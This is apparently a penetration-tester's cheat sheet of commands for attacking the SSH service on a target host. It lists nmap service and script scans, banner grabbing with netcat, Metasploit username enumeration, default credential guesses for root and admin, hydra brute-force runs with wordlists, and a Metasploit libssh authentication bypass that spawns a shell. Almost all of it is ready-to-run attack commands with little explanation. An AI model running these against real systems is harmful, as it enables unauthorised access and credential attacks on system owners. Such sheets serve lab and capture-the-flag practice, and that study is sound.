## detect ssh service and run default scripts on port 22

```bash
nmap -sV -sC -p 22 <T_IP>
```

## SSH Banner

```bash
nc -nv <T_IP> 22
```

```bash
ssh -v user@<T_IP> 2>&1 | grep OpenSSH
```

## Comprehensive SSH scan

```bash
nmap -p 22 --script ssh-* <T_IP>
```

## SSH Username Enumeration

```text
msf6 > use auxiliary/scanner/ssh/ssh_enumusers
msf6 > set USER_FILE /usr/share/wordlists/metasploit/unix_users.txt
```

## default creds

```bash
ssh root@<T_IP>
# Try: root, toor, password
```

```bash
ssh admin@<T_IP>
# Try: admin, password
```

```bash
ssh Administrator@<T_IP>
```

## SSH Login brute

```text
msf6 > use auxiliary/scanner/ssh/ssh_login
```

## Brute Forcing SSH

```bash
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt <T_IP> -t 4 ssh
```

```bash
hydra -L /usr/share/wordlists/metasploit/unix_users.txt -P /usr/share/wordlists/metasploit/unix_passwords.txt <T_IP> ssh
```

## libssh authentication bypass (versions < 0.8.4 / 0.7.6)

```bash
searchsploit libssh
```

```text
use auxiliary/scanner/ssh/libssh_auth_bypass
set RHOSTS <T_IP>
set SPAWN_PTY true
```
